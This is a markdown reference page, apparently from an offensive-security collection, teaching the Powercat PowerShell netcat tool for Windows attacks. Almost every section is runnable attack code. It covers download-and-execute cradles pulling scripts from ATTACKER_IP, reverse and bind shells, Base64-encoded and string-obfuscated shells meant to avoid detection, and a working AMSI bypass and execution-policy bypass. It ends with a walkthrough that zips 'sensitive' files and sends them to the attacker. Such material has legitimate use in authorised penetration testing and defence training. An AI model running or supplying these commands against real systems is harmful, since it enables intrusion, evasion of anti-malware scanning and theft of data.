---
title: "Powercat - PowerShell Netcat"
description: "PowerShell implementation of netcat for Windows reverse shells, file transfers, and port scanning"
category: "reverse_shells"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
language: "PowerShell"
platform: "Windows"
---

# Powercat

## Overview

Powercat is a PowerShell implementation of netcat designed for Windows environments. It provides reverse shells, bind shells, port scanning, and file transfer capabilities without requiring external executables. Powercat runs entirely in memory using PowerShell's scripting capabilities, making it ideal for Windows penetration testing where executing dropped binaries may be detected.

## Chapter 1: Installation

### Import Directly

```powershell
IEX (New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1')
```

### Download and Import

```powershell
# Download the script
Invoke-WebRequest -Uri "http://ATTACKER_IP/powercat.ps1" -OutFile "C:\Temp\powercat.ps1"

# Import the function
. .\powercat.ps1
```

### Verify Installation

```powershell
powercat -h
```

## Chapter 2: Basic Usage

### Reverse Shell

```powershell
# Target
powercat -c ATTACKER_IP -p 4444 -e cmd.exe

# Attacker (netcat listener)
nc -lvnp 4444
```

**Explanation**: Powercat connects to the attacker's netcat listener and executes `cmd.exe`, providing a Windows command prompt through the network connection.

### Bind Shell

```powershell
# Target
powercat -l -p 4444 -e cmd.exe

# Attacker
nc 192.168.1.100 4444
```

**Explanation**: Powercat listens for incoming connections on port 4444 and provides a command prompt to whoever connects.

### Port Scanning

```powershell
powercat -c 192.168.1.1 -p 1-1000 -o
```

**Explanation**: Scans TCP ports 1 through 1000 on the target, reporting open ports. The `-o` flag outputs scan results.

## Chapter 3: Reverse Shells

### PowerShell Reverse Shell

```powershell
# Target
powercat -c ATTACKER_IP -p 4444 -e powershell.exe

# Attacker
nc -lvnp 4444
```

**Explanation**: Provides a PowerShell session instead of cmd.exe, enabling access to PowerShell cmdlets and .NET framework on the target system.

### Encoded Reverse Shell

```powershell
# Generate encoded command
$cmd = 'powercat -c ATTACKER_IP -p 4444 -e cmd.exe'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -enc $encoded
```

**Explanation**: The command is Base64-encoded to avoid detection by basic string matching. The encoded payload is executed via PowerShell's `-enc` parameter, bypassing simple command-line logging.

### Reverse Shell with DNS

```powershell
powercat -c dns.domain.com -p 4444 -e cmd.exe -dns
```

**Explanation**: The `-dns` flag resolves the hostname via DNS before connecting, providing an additional layer of indirection and potentially bypassing IP-based filtering.

## Chapter 4: File Transfer

### Send File

```powershell
# Sender
powercat -c ATTACKER_IP -p 4444 -i C:\path\to\file.txt

# Receiver
nc -lvnp 4444 > received_file.txt
```

**Explanation**: Transfers a file from the Windows target to the attacker's machine through the network connection.

### Receive File

```powershell
# Receiver
powercat -l -p 4444 -i C:\path\to\save\file.txt

# Sender
nc 192.168.1.100 4444 < file_to_send.txt
```

**Explanation**: The target receives a file from the attacker through the established connection.

## Chapter 5: Advanced Techniques

### Relayed Connection

```powershell
powercat -c ATTACKER_IP -p 4444 -ep 5555 -r
```

**Explanation**: The `-ep` flag specifies an additional endpoint, and `-r` enables relay mode. Data received on one connection is forwarded to the other, enabling multi-hop pivoting.

### UDP Mode

```powershell
powercat -c ATTACKER_IP -p 4444 -u
```

**Explanation**: The `-u` flag switches to UDP mode. UDP connections do not require a formal handshake, which can be useful for certain network scenarios.

### Connection Timeout

```powershell
powercat -c ATTACKER_IP -p 4444 -e cmd.exe -t 10
```

**Explanation**: The `-t` flag sets a 10-second connection timeout. If the connection is not established within this period, powercat exits. This prevents indefinite hanging on unreachable hosts.

## Chapter 6: Evasion Techniques

### In-Memory Execution

```powershell
# Download and execute in memory
IEX (New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1')
powercat -c ATTACKER_IP -p 4444 -e cmd.exe
```

**Explanation**: Powercat is downloaded and executed directly in memory without writing to disk. This technique evades file-based detection mechanisms and leaves minimal forensic artifacts.

### AMSI Bypass

```powershell
# Bypass AMSI (Anti-Malware Scan Interface)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Explanation**: The AMSI bypass prevents PowerShell from sending script content to the Windows Defender AMSI interface for scanning. This must be executed before importing powercat to avoid detection.

### Obfuscated Execution

```powershell
# Reverse shell with string obfuscation
$a = 'power' + 'cat'
$b = '-c'
$c = 'ATTACKER_IP'
& $a $b $c -p 4444 -e cmd.exe
```

**Explanation**: Breaking the command string into parts prevents static analysis tools from detecting the full command. The command is reconstructed at runtime.

## Chapter 7: Practical Scenarios

### Domain Enumeration

```powershell
powercat -c ATTACKER_IP -p 4444 -e powershell.exe

# On target
Get-ADUser -Filter * -Properties Name,Email
Get-ADGroup -Filter * | Select Name
nltest /dclist:
```

**Explanation**: Once a PowerShell session is established, Active Directory enumeration commands reveal domain users, groups, and domain controllers.

### File Exfiltration

```powershell
# Compress and transfer
Compress-Archive -Path C:\sensitive\* -DestinationPath C:\Temp\data.zip
powercat -c ATTACKER_IP -p 4444 -i C:\Temp\data.zip
```

**Explanation**: Sensitive files are compressed and transferred to the attacker's machine. The ZIP archive reduces transfer time and bundles related files.

## Chapter 8: Limitations and Considerations

### PowerShell Execution Policy

```powershell
# Bypass execution policy
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1')"
```

**Explanation**: The `-ep bypass` flag overrides the PowerShell execution policy, allowing the script to run even when execution policies are restricted.

### 32-bit vs 64-bit

```powershell
# Force 32-bit PowerShell
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1')"
```

**Explanation**: Some applications require 32-bit PowerShell. Using the SysWOW64 path ensures the 32-bit version is used, which may be necessary for compatibility with certain DLLs or COM objects.

## Resources

- [Powercat GitHub Repository](https://github.com/besimorhino/powercat)
- [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/)
- [PowerShell AM-Bypass Techniques](https://amsi.fail/)
